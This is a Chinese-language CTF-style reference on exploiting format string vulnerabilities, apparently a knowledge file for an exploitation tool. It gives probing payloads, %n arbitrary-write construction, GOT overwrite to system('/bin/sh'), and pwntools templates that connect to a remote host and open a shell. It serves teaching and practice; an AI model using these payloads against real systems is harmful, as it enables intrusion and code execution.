# 格式化字符串漏洞

## 描述
当 `printf`、`sprintf`、`fprintf` 等格式化函数的格式字符串由用户控制（如 `printf(buf)` 而非 `printf("%s", buf)`），攻击者可利用 `%p` 泄漏栈内存、`%n` 任意地址写，从而实现信息泄漏、任意写、控制执行流。

## 触发条件
- 代码中存在 `printf(user_input)`、`sprintf(buf, user_input)`、`syslog(user_input)` 等。
- 用户输入直接作为格式字符串参数，未使用固定格式符。
- 检测：输入 `%p.%p.%p` 或 `AAAA%p.%p.%p`，若返回十六进制地址则存在漏洞。

## 原理
- `printf` 按 `%x`、`%p`、`%n` 等格式符从栈上（或寄存器）依次取参数。
- 64 位下前 6 个参数在 RDI/RSI/RDX/RCX/R8/R9，之后在栈上。
- 用户控制的格式字符串本身在栈上，通过 `%N$p`（N 为参数序号）可读取/写入栈上任意位置的值。
- 若格式字符串中包含目标地址，配合 `%N$n` 可向该地址写入已打印字符数。

## 检测方法（确定偏移）
1. 输入 `AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p`。
2. 找到 `41414141`（或 `0x4141414141414141`）出现在第几个参数，即为格式化字符串在栈上的偏移 `offset`。
3. 例如输出 `...0x4141414141414141...` 出现在第 6 个，则 `offset=6`。
4. 后续利用均基于此 offset。

## 利用方式

### 1. %p 泄漏（信息泄漏）
- **泄漏栈地址**：`%N$p` 读取第 N 个参数（栈上的值）。
- **泄漏 Canary**：Canary 通常在格式字符串后不远处，逐个 `%p` 探测。
- **泄漏 libc 地址**：栈上常有 `__libc_start_main_ret` 等返回地址，泄漏后减去已知偏移得 libc 基址。
  ```
  payload = "%N$p"  # N 为 __libc_start_main_ret 所在偏移
  ```
- **泄漏程序地址**（绕过 PIE）：栈上保存的返回地址低 12 位固定，可计算程序基址。
- **工具**：调用 `pwn_fmtstr_exploit(host, port, offset, payload_type="leak")` 自动发送 `%N$p` 泄漏。

### 2. %n 任意写
- `%n` 将已打印字符数写入参数指向的地址（int），`%hn` 写 short，`%hhn` 写 byte，`%ln` 写 long。
- **写入指定值**：用宽度控制打印字符数，如 `%100c%N$n` 向第 N 个参数地址写 100。
- **写大值（如地址 0x401020）**：分字节/字写入避免打印过多字符：
  ```
  # 写 0x401020 到 addr，分两次写 %hn
  payload = %Nc%K$hn + ... (按字节从小到大写)
  ```
- **payload 结构**：格式字符串 + 目标地址，地址放在格式串末尾（因含 `\x00`）。
  ```
  [格式符部分 + 填充对齐] + [addr_low] + [addr_high]
  ```
- **工具**：调用 `pwn_fmtstr_exploit(host, port, offset, payload_type="write", write_addr="0x404018", write_val="0x401020")`。

### 3. fmtstr_payload 使用（pwntools 自动生成）
pwntools 提供 `fmtstr_payload` 自动生成任意写 payload：
```python
from pwn import *
# offset: 格式字符串偏移
# {addr: val}: 写入字典，addr 写入 val
payload = fmtstr_payload(offset, {0x404018: 0x401020})
# 参数说明:
#   offset: 格式化字符串在栈上的偏移
#   {addr: val}: 目标地址和值的映射
#   numbwritten=0: 已打印字符数（前面若有输出需加上）
#   write_size='byte'/'short'/'int': 写入单位，byte 最稳但 payload 长
io.sendline(payload)
```
- **注意**：`fmtstr_payload` 生成的 payload 含不可见字符，远程发送时需用 `io.send`（非 sendline）或注意换行处理。

### 4. GOT 覆写（控制执行流）
- **目标**：将 `printf@got` 或 `puts@got` 覆写为 `system` 地址，下次调用该函数时实际执行 `system`。
- **条件**：Partial RELRO（GOT 可写）。
- **步骤**：
  1. `pwn_checksec` 确认 RELRO 非 Full，获取 `got['printf']` 地址。
  2. 泄漏 libc 地址，计算 `system` 实际地址。
  3. 用 `fmtstr_payload(offset, {got_printf: system_addr})` 覆写。
  4. 输入 `/bin/sh`，触发 `printf("/bin/sh")` → 实际执行 `system("/bin/sh")`。
- **变体**：覆写 `free@got` 为 `system`，输入 `/bin/sh` 触发 `free("/bin/sh")` → `system("/bin/sh")`。

### 5. 覆写返回地址
- 若 Canary/栈布局允许，可直接覆写栈上保存的返回地址。
- 需先泄漏栈地址定位返回地址在栈上的位置。

## 常用 Payload 模板

### 泄漏栈与 libc 地址
```python
from pwn import *
io = remote('host', port)
io.sendline(b'%p.'*20)  # 泄漏前 20 个参数
leak = io.recv()
# 解析并寻找 __libc_start_main_ret
```

### 自动任意写
```python
from pwn import *
io = remote('host', port)
offset = 6
# 覆写 printf@got 为 system
payload = fmtstr_payload(offset, {elf.got['printf']: system_addr})
io.sendline(payload)
io.sendline(b'/bin/sh')
io.interactive()
```

### 手动构造 %n 写入
```python
# 向 0x404018 写入 0x1234（分两次 %hn）
addr = 0x404018
payload = b'%' + str(0x1234 & 0xffff).encode() + b'c%8$hn'
payload += b'%' + str((0x1234 >> 16) - (0x1234 & 0xffff) & 0xffff).encode() + b'c%9$hn'
# 补齐对齐后放地址
payload = payload.ljust(aligned_len, b'\x00') + p64(addr) + p64(addr+2)
```

## 绕过技巧
- **offset 探测**：若输入被加前缀（如 `Hello: `），需调整 offset 或用 `%N$` 直接定位。
- **不可见字符**：地址含 `\x00` 会截断，将地址放在 payload 末尾；用 `fmtstr_payload` 自动处理。
- **格式符过滤**：若 `%` 被过滤，可尝试 `$` + 数字直接定位（部分实现仍可用）；或换输入点。
- **Full RELRO**：GOT 只读，改写 `__malloc_hook`/`__free_hook`/栈返回地址。
- **栈地址随机化**：先 `%p` 泄漏栈地址，再据此构造写入 payload。

## 注意
- offset 必须精确，先用 `%N$p` 逐个探测确认。
- `%n` 写入时注意大小端和字节序，推荐用 `fmtstr_payload` 自动生成。
- 多次触发漏洞时，每次 offset 可能变化（若输入位置不同）。
- `printf` 输出可能被缓冲，必要时用 `fflush` 或换行触发刷新。
- 写入大值时打印字符数巨大，可能阻塞，优先用 `%hhn` 分字节写。
